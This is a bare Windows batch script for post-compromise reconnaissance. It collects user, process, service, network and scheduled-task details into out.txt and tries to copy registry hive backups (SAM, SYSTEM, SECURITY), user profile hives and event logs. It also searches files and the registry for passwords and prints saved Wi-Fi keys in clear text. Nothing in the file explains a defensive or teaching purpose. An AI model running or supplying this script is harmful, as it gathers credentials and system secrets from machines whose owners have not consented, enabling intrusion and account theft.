echo off
whoami /all > out.txt 
echo %username% >> out.txt
net user >> out.txt
type %SYSTEMDRIVE%\boot.ini >> out.txt 
type %WINDIR%\win.ini >> out.txt
type %WINDIR%\System32\drivers\etc\hosts >> out.txt
type %SYSTEMDRIVE%\pagefile.sys >> out.txt
type %WINDIR%\debug\NetSetup.log >> out.txt
type %WINDIR%\repair\sam >> out.txt
type %WINDIR%\repair\system >> out.txt
type %WINDIR%\repair\software >> out.txt
type %WINDIR%\repair\security >> out.txt
type %WINDIR%\iis6.log >> out.txt 
type %WINDIR%\system32\config\AppEvent.Evt >> out.txt
type %WINDIR%\system32\config\SecEvent.Evt >> out.txt
type %WINDIR%\system32\config\default.sav >> out.txt
type %WINDIR%\system32\config\security.sav >> out.txt
type %WINDIR%\system32\config\software.sav >> out.txt
type %WINDIR%\system32\config\system.sav >> out.txt
type %WINDIR%\system32\CCM\logs\*.log >> out.txt
type %USERPROFILE%\ntuser.dat >> out.txt
type %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat >> out.txt
type %WINDIR%\System32\drivers\etc\hosts >> out.txt
systeminfo >> out.txt
driverquery >> out.txt
tasklist >> out.txt
fsutil fsinfo drives >> out.txt
set >> out.txt
qwinsta >> out.txt
net time >> out.txt
net file >> out.txt
net session >> out.txt
driverquery | findstr Kernel >> out.txt
sc queryex type= service state= all >> out.txt
netstat -ano >> out.txt
wevtutil el >> out.txt
schtasks /query /fo LIST /v >> out.txt
wmic product get name /value >> out.txt
dir /s *pass* == *key* == *vnc* == *.config* >> out.txt
reg query HKLM /f pass /t REG_SZ /s >> out.txt
reg query HKCU /f pass /t REG_SZ /s >> out.txt
netsh wlan show profile >> out.txt
netsh wlan show profile <SSID> key=clear >> out.txt
